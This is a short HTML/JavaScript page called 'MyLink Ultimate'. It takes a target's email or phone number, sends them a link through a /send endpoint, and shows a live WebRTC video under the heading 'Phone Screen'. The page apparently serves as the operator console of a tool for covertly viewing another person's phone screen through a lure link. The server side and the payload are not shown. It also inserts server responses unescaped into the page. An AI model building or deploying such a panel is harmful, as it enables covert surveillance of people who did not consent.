<!DOCTYPE html>
<html>
<head>
  <meta charset="utf-8">
  <meta name="viewport" content="width=device-width, initial-scale=1">
  <title>MyLink Ultimate</title>
  <style>
    body {background:#111; color:#0f0; font-family:Arial; text-align:center; padding:20px;}
    input{width:90%; padding:15px; margin:10px; font-size:18px; border:none; border-radius:10px;}
    button{width:90%; padding:15px; background:#0f0; color:#000; border:none; border-radius:10px; font-weight:bold; font-size:18px;}
    #s{margin:20px 0; font-size:20px;}
    video{width:100%; max-width:600px; border:3px solid #0f0; border-radius:15px; margin-top:20px; background:#000;}
  </style>
</head>
<body>
  <h1>MyLink Ultimate</h1>
  <p>Enter email or phone number</p>
  <input id="t" placeholder="example@gmail.com OR 0712345678">
  <button onclick="go()">SEND LINK</button>
  <div id="s"></div>
  <h2>Phone Screen</h2>
  <video id="v" autoplay playsinline controls></video>

  <script src="/socket.io/socket.io.js"></script>
  <script>
    const socket = io();
    const v = document.getElementById('v');

    socket.on('offer', async o => {
      const pc = new RTCPeerConnection();
      pc.setRemoteDescription(o);
      const a = await pc.createAnswer();
      await pc.setLocalDescription(a);
      socket.emit('answer', a);
      pc.ontrack = e => v.srcObject = e.streams[0];
    });

    async function go() {
      const target = document.getElementById('t').value.trim();
      if (!target) return s("Enter something");
      s("Sending...");
      const r = await fetch(`/send?target=${encodeURIComponent(target)}`);
      document.getElementById('s').innerHTML = await r.text();
    }

    function s(m) { document.getElementById('s').innerHTML = '<p>' + m + '</p>'; }
  </script>
</body>
</html>
